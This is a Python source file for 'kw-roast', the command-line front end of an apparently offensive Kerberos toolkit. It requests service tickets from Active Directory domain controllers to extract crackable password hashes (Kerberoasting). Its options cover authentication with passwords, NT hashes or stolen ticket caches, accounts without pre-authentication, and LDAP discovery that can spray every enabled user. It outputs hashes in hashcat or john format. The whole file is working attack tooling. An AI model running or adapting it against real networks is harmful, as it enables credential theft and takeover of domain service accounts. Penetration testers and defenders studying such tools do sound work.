"""CLI entry point for ``kw-roast`` - TGS-REP Roast (Kerberoast)."""

from __future__ import annotations

import argparse
import sys

from kerbwolf import __version__
from kerbwolf.attacks.kerberoast import kerberoast, kerberoast_no_preauth
from kerbwolf.cli._common import build_credential, collect_targets, ldap_connect_from_args, ldap_discover_all_users, output_results, print_header, resolve_context
from kerbwolf.core.ccache import load_tgt_from_ccache
from kerbwolf.core.ldap import find_kerberoastable
from kerbwolf.log import Logger
from kerbwolf.models import ETYPE_BY_NAME, HashFormat, KerberosContext, KerbWolfError, RoastResult, TransportProtocol


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="kw-roast",
        description="TGS-REP Roast (Kerberoast) - request service tickets and extract hashes.",
        epilog="Examples:\n  kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p pass --ldap\n  kw-roast -k -c admin.ccache --ldap\n  kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 --no-preauth jsmith -t MSSQLSvc/db01\n  kw-roast -d CORP.LOCAL -t svc_sql -t MSSQLSvc/db01.corp.local\n",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    parser.add_argument("-v", "--verbose", action="count", default=0, help="Increase verbosity (-v, -vv)")

    # -- Mode 1: no-preauth (DONT_REQ_PREAUTH account, no credentials needed) --
    grp = parser.add_argument_group(
        "no-preauth mode (no credentials needed)",
        "Use a DONT_REQ_PREAUTH account to request service tickets via AS-REQ.",
    )
    grp.add_argument("--no-preauth", metavar="USER", help="DONT_REQ_PREAUTH account for AS-REQ kerberoasting")

    # -- Mode 2: NTLM auth --
    grp = parser.add_argument_group(
        "NTLM authentication",
        "Authenticate with password or NT hash to request a TGT, then use it for TGS requests.",
    )
    grp.add_argument("-u", "--user", metavar="USER", help="Username (sAMAccountName)")
    grp.add_argument("-p", "--password", metavar="PASS", help="Cleartext password")
    grp.add_argument("-H", "--hashes", metavar="HASH", help="NTLM hash - LM:NT, :NT, or NT")

    # -- Mode 3: Kerberos auth (ccache) --
    grp = parser.add_argument_group(
        "Kerberos authentication",
        "Authenticate with an existing TGT from a ccache file. Domain and user are auto-detected from the ccache.",
    )
    grp.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos auth via ccache")
    grp.add_argument("-c", "--ccache", metavar="FILE", help="CCache file with TGT (or set KRB5CCNAME)")

    # -- Connection --
    grp = parser.add_argument_group("connection")
    grp.add_argument("-d", "--domain", help="Domain FQDN (auto-detected from ccache with -k)")
    grp.add_argument("--dc-ip", metavar="IP", help="DC IP or hostname (resolved via DNS SRV if omitted)")
    grp.add_argument("--dc-hostname", metavar="HOST", help="DC FQDN for Kerberos SPN (auto-detected if omitted)")
    grp.add_argument("--transport", choices=["tcp", "udp"], default="tcp", help="Transport protocol (default: tcp)")
    grp.add_argument("--timeout", type=float, default=10.0, help="Network timeout in seconds (default: 10)")

    # -- Targets --
    grp = parser.add_argument_group(
        "targets",
        "Specify targets manually, or use LDAP discovery (requires authentication).",
    )
    grp.add_argument("-t", "--target", action="append", metavar="SPN/USER", help="SPN, sAMAccountName, or UPN (repeatable)")
    grp.add_argument("-T", "--targets-file", metavar="FILE", help="File with targets, one per line (# comments, blank lines skipped)")
    grp.add_argument("--ldap", action="store_true", help="LDAP: discover accounts with servicePrincipalName set")
    grp.add_argument("--ldap-all", action="store_true", help="LDAP: try every enabled user (spray)")
    grp.add_argument("--ldap-ssl", action="store_true", help="Use LDAPS (port 636)")

    # -- Output --
    grp = parser.add_argument_group("output")
    grp.add_argument("-e", "--enctype", choices=["des-cbc-crc", "des-cbc-md5", "rc4", "aes128", "aes256"], default="rc4", help="Encryption type (default: rc4)")
    grp.add_argument("-o", "--output", metavar="FILE", help="Write hashes to file")
    grp.add_argument("--format", choices=["hashcat", "john"], default="hashcat", dest="hash_format", help="Hash output format (default: hashcat)")

    return parser


def _validate(args: argparse.Namespace, logger: Logger) -> None:
    """Validate argument combinations before doing any work."""
    has_ntlm = args.user and (args.password or args.hashes)
    has_kerberos = args.kerberos
    has_ldap = args.ldap or args.ldap_all
    has_targets = args.target or args.targets_file
    has_no_preauth = bool(args.no_preauth)

    # -c without -k warning (already in resolve_context, but validate early)
    if args.ccache and not args.kerberos:
        logger.warning("-c/--ccache provided without -k/--kerberos. Add -k to use Kerberos auth.")

    # NTLM auth requires both user and secret
    if args.user and not args.password and not args.hashes and not has_kerberos and not has_no_preauth:
        logger.error("-u/--user requires -p/--password or -H/--hashes.")
        sys.exit(1)

    # LDAP requires auth
    if has_ldap and not has_ntlm and not has_kerberos:
        logger.error("--ldap/--ldap-all requires authentication. Use -u/-p (NTLM) or -k (Kerberos).")
        sys.exit(1)

    # Must have targets
    if not has_targets and not has_ldap:
        logger.error("No targets. Use -t SPN/USER, -T FILE, --ldap, or --ldap-all.")
        sys.exit(1)


def main(argv: list[str] | None = None) -> None:
    """Entry point for ``kw-roast``."""
    parser = _build_parser()
    args = parser.parse_args(argv)
    logger = Logger(args.verbose)
    _validate(args, logger)
    ctx = resolve_context(args, logger)

    targets = collect_targets(args)

    if args.ldap or args.ldap_all:
        targets.extend(_ldap_discover(args, logger, ctx))

    targets = list(dict.fromkeys(targets))

    etype = ETYPE_BY_NAME[args.enctype]
    transport = TransportProtocol(args.transport)
    hash_format = HashFormat(args.hash_format)

    # -- header --
    auth = "ccache" if args.kerberos else args.user or "-"
    if args.no_preauth:
        auth = f"no-preauth ({args.no_preauth})"
    target_desc = f"{len(targets)} target(s)"
    if args.ldap:
        target_desc += " (LDAP)"
    elif args.ldap_all:
        target_desc += " (LDAP spray)"
    print_header(
        "kw-roast",
        [
            ("Attack", "TGS-REP Roast"),
            ("Domain", ctx.domain),
            ("DC", f"{ctx.dc_hostname} ({ctx.dc_ip})" if ctx.dc_hostname else ctx.dc_ip),
            ("Auth", auth),
            ("Etype", etype.name),
            ("Targets", target_desc),
            ("Transport", transport.value),
            ("Format", hash_format.value),
            *([("Output", args.output)] if args.output else []),
        ],
    )

    results: list[RoastResult] = []

    try:
        if args.no_preauth:
            logger.info("AS-REQ kerberoasting via %s (etype: %s, targets: %d)", args.no_preauth, etype.name, len(targets))
            results = kerberoast_no_preauth(
                args.no_preauth,
                domain=ctx.domain,
                dc_ip=ctx.dc_ip,
                etype=etype,
                target_users=targets,
                hash_format=hash_format,
                transport=transport,
                timeout=ctx.timeout,
            )
        elif args.kerberos:
            tgt_bytes, session_key, cipher_cls = load_tgt_from_ccache(args.ccache)
            logger.info("TGS-REP Roast via ccache (etype: %s, targets: %d)", etype.name, len(targets))
            results = kerberoast(
                dc_ip=ctx.dc_ip,
                domain=ctx.domain,
                etype=etype,
                target_spns=targets,
                hash_format=hash_format,
                transport=transport,
                timeout=ctx.timeout,
                tgt=tgt_bytes,
                tgt_session_key=session_key,
                tgt_cipher_cls=cipher_cls,
            )
        else:
            cred = build_credential(args)
            logger.info("TGS-REP Roast (etype: %s, targets: %d)", etype.name, len(targets))
            results = kerberoast(
                cred,
                dc_ip=ctx.dc_ip,
                etype=etype,
                target_spns=targets,
                hash_format=hash_format,
                transport=transport,
                timeout=ctx.timeout,
            )
    except KerbWolfError as exc:
        logger.error("%s", exc)  # noqa: TRY400
        sys.exit(1)
    except Exception:
        logger.exception("Unexpected error")
        sys.exit(1)

    output_results(results, args.output, logger)


def _ldap_discover(args: argparse.Namespace, logger: Logger, ctx: KerberosContext) -> list[str]:
    """Enumerate kerberoastable targets via LDAP."""
    if args.ldap_all:
        return ldap_discover_all_users(args, logger, ctx)

    conn = ldap_connect_from_args(args, logger, ctx)

    logger.info("LDAP: searching for accounts with SPNs in %s", ctx.domain)
    accounts = find_kerberoastable(conn, ctx.domain)
    spns: list[str] = []
    for account in accounts:
        if account.spns:
            spns.append(account.spns[0])
            logger.verbose("  %s → %s", account.samaccountname, account.spns[0])
    logger.info("LDAP: found %d kerberoastable accounts", len(spns))
    conn.unbind()
    return spns


if __name__ == "__main__":
    main()
